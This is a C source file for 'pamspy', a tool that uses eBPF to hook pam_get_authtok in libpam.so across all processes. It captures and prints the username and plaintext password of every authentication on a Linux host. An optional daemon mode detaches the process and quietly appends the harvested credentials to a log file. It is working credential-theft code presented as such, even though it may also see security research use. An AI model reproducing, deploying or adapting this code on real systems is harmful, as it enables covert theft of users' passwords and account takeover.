#include <argp.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <bpf/libbpf.h>
#include <stdbool.h>
#include <sys/resource.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include "pamspy.skel.h"
#include "pamspy_symbol.h"
#include "pamspy_event.h"

const char header[] =
"**************************************************************\n"
"*           / __ \\/ __ `/ __ `__ \\/ ___/ __ \\/ / / /         *\n"
"*          / /_/ / /_/ / / / / / (__  ) /_/ / /_/ /          *\n"
"*         / .___/\\__,_/_/ /_/ /_/____/ .___/\\__, /           *\n"
"*        /_/                        /_/    /____/            *\n"
"*                               by @citronneur (v0.2)        *\n"
"**************************************************************\n";


const char *argp_program_version = "pamspy 1.0";
const char *argp_program_bug_address = "";
const char argp_program_doc[] =
"pamspy\n"
"\n"
"Uses eBPF to dump secrets use by PAM (Authentication) module\n"
"By hooking the pam_get_authtok function in libpam.so\n"
"\n"
"USAGE: ./pamspy -p $(/usr/sbin/ldconfig -p | grep libpam.so | cut -d ' ' -f4) -d /var/log/trace.0\n";

/******************************************************************************/
/*!
 *  \brief   arguments
 */
static struct env {
    int verbose;    // will print more details of the execution
    int print_headers;
    char* libpam_path;
    char* output_path;
} env;

/******************************************************************************/
static const struct argp_option opts[] = {
    { "path", 'p', "PATH", 0, "Path to the libpam.so file" },
    { "daemon", 'd', "OUTPUT", 0, "Start pamspy in daemon mode and output in the file passed as argument" },
    { "verbose", 'v', NULL, 1, "Verbose mode" },
    { "print-headers", 'r', NULL, 1, "Print headers of the program" },
    {},
};

/******************************************************************************/
/*!
 *  \brief  use to manage exit of the infinite loop
 */
static volatile sig_atomic_t exiting;

/******************************************************************************/
/*!
 *  signal handler
 */
void sig_int(int signo)
{
    exiting = 1;
}

/******************************************************************************/
/*!
 * \brief   print debug informations of libbpf
 */
static int libbpf_print_fn(enum libbpf_print_level level, const char *format, va_list args)
{
    return vfprintf(stderr, format, args);
}

/******************************************************************************/
/*!
 *  \brief  parse arguments of the command line
 */
static error_t parse_arg(int key, char *arg, struct argp_state *state)
{
    switch (key) {
    case 'p':
        env.libpam_path = strdup(arg);
        break;
    case 'd':
        env.output_path = strdup(arg);
        break;
    case 'v':
        env.verbose = true;
        break;
    case 'r':
        env.print_headers = true;
        break;
    case ARGP_KEY_ARG:
        argp_usage(state);
        break;
    default:
        return ARGP_ERR_UNKNOWN;
    }
    return 0;
}

/******************************************************************************/
// parse args configuration
static const struct argp argp = {
    .options = opts,
    .parser = parse_arg,
    .doc = argp_program_doc,
};

/******************************************************************************/
/*!
 *  \brief  each time a secret from ebpf is detected
 */
static int handle_event(void *ctx, void *data, size_t data_sz)
{
    event_t* e = (event_t*)data;
    if (env.output_path != NULL)
    {
        fprintf(stderr, "%u,%s,%s,%s\n", e->pid, e->comm, e->username, e->password);
    }
    else
    {
        fprintf(stderr, "%-6u | %-15s | %-20s | %s\n", e->pid, e->comm, e->username, e->password);
    }
    return 0;
}

/******************************************************************************/
static bool bump_memlock_rlimit(void)
{
    struct rlimit rlim_new = 
    {
        .rlim_cur    = RLIM_INFINITY,
        .rlim_max    = RLIM_INFINITY,
    };

    if (setrlimit(RLIMIT_MEMLOCK, &rlim_new)) 
    {
        return false;
    }
    return true;
}

/******************************************************************************/
static void start_daemon(void)
{
    pid_t child = fork();

    // error during fork
    if (child < 0)
    {
        exit(child);
    }

    // parent process
    if (child > 0)
    {
        exit(0);
    }

    // become the group leader
    setsid();

    child = fork();

    // error during fork
    if (child < 0)
    {
        exit(child);
    }

    // parent process
    if (child > 0)
    {
        exit(0);
    }

    umask(0);

    int chdir_flag = chdir("/tmp");
    if (chdir_flag != 0)
    {
        exit(1);
    }

    close(0);
    close(1);
    close(2);

    int fd_0 = open("/dev/null", O_RDWR);
    if (fd_0 != 0)
    {
        exit(1);
    }

    int fd_1 = open(env.output_path, O_RDWR | O_CREAT | O_APPEND, 0600);
    if (fd_1 != 1)
    {
        exit(1);
    }

    int fd_2 = dup(fd_1);
    if (fd_2 != 2)
    {
        exit(1);
    }
}

/******************************************************************************/
int main(int argc, char **argv)
{
    struct ring_buffer *rb = NULL;
    struct pamspy_bpf *skel;
    int err;

    signal(SIGINT, sig_int);
    signal(SIGTERM, sig_int);

    env.verbose = false;
    env.print_headers = false;
    env.libpam_path = NULL;
    env.output_path = NULL;

    // Parse command line arguments
    err = argp_parse(&argp, argc, argv, 0, NULL, NULL);
    if (err) 
    {
        return err;
    }

    if(env.libpam_path == NULL) 
    {
        fprintf(stderr, "pamspy: argument PATH is mandatory\n");
        exit(1);
    }

    int offset = pamspy_find_symbol_address(env.libpam_path, "pam_get_authtok");

    if (offset == -1) 
    {
        fprintf(stderr, "pamspy: Unable to find pam_get_authtok function in %s\n", env.libpam_path);
        exit(1);
    }

    // check deamon mode
    if (env.output_path != NULL)
    {
        start_daemon();
    }

    if(env.verbose)
        libbpf_set_print(libbpf_print_fn);


    if(!bump_memlock_rlimit())
    {
        fprintf(stderr, "pamspy: Failed to increase RLIMIT_MEMLOCK limit! (hint: run as root)\n");
        exit(1);
    }
 
    // Open BPF application 
    skel = pamspy_bpf__open();
    if (!skel) {
        fprintf(stderr, "pamspy: Failed to open BPF program: %s\n", strerror(errno));
        return 1;
    }

    // Load program
    err = pamspy_bpf__load( skel);
    if (err) {
        fprintf(stderr, "pamspy: Failed to load BPF program: %s\n", strerror(errno));
        goto cleanup;
    }
    
    // Attach userland probe 
    skel->links.trace_pam_get_authtok = bpf_program__attach_uprobe(
        skel->progs.trace_pam_get_authtok,
		true,           /* uretprobe */
		-1,             /* any pid */
		env.libpam_path,       /* path to the lib*/
		offset
    );

    // Set up ring buffer
    rb = ring_buffer__new(bpf_map__fd( skel->maps.rb), handle_event, NULL, NULL);
    if (!rb) {
        err = -1;
        fprintf(stderr, "pamspy: Failed to create ring buffer\n");
        goto cleanup;
    }

    if(env.print_headers)
    {
        fprintf(stdout, header);
        fprintf(stdout, "%-6s | %-15s | %-20s | %s\n", "PID", "PROCESS", "USERNAME", "PASSWORD");
        fprintf(stdout, "--------------------------------------------------------------\n");
    }

    while (!exiting) {
        err = ring_buffer__poll(rb, 100 /* timeout, ms */);
        /* Ctrl-C will cause -EINTR */
        if (err == -EINTR) {
            err = 0;
            break;
        }
        if (err < 0) {
            fprintf(stderr, "pamspy: Error polling perf buffer: %d\n", err);
            break;
        }
    }

cleanup:
    pamspy_bpf__destroy( skel);
    return -err;
}
